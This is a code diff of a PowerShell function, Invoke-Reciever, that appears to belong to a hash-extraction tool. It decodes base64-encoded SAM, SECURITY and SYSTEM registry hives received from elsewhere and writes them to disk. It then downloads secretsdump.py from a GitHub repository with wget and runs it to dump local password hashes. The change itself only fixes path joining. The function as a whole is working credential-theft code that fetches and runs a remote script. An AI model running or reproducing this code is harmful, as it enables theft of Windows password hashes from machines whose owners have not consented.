@@ -37,19 +37,19 @@ function Invoke-Reciever {
     Write-Host Processing SAM
 
     $msg1 += [text.encoding]::ASCII.GetString( (1..$bytes1 | ForEach-Object { $byte1[$_-1] } ) )
-    [IO.File]::WriteAllBytes(((resolve-path './')+'SAM'), [Convert]::FromBase64String($msg1))
+    [IO.File]::WriteAllBytes((Join-Path (resolve-path './') '/SAM'), [Convert]::FromBase64String($msg1))
 
     Write-Host Processed SAM
     Write-Host Processing SECURITY
 
     $msg2 += [text.encoding]::ASCII.GetString( (1..$bytes2 | ForEach-Object { $byte2[$_-1] } ) )
-    [IO.File]::WriteAllBytes(((resolve-path './')+'SECURITY'), [Convert]::FromBase64String($msg2))
+    [IO.File]::WriteAllBytes((Join-Path (resolve-path './') '/SECURITY'), [Convert]::FromBase64String($msg2))
 
     Write-Host Processed SECURITY
     Write-Host Processing SYSTEM
 
     $msg3 += [text.encoding]::ASCII.GetString( (1..$bytes3 | ForEach-Object { $byte3[$_-1] } ) )
-    [IO.File]::WriteAllBytes(((resolve-path './')+'SYSTEM'), [Convert]::FromBase64String($msg3))
+    [IO.File]::WriteAllBytes((Join-Path (resolve-path './') '/SYSTEM'), [Convert]::FromBase64String($msg3))
 
     Write-Host Processed SYSTEM
     Write-Host
@@ -65,7 +65,7 @@ function Invoke-Reciever {
     Write-Host
     Write-Host
 
-    wget "http://raw.github.com/mo-tec/HashExtractor/master/secretsdump.py" -UseBasicParsing -out ((resolve-path './')+'secretsdump.py')
+    wget "http://raw.github.com/mo-tec/HashExtractor/master/secretsdump.py" -UseBasicParsing -out (Join-Path (resolve-path './') '/secretsdump.py')
     .\secretsdump.py -system SYSTEM -security SECURITY -sam SAM LOCAL
 }
 Invoke-Reciever
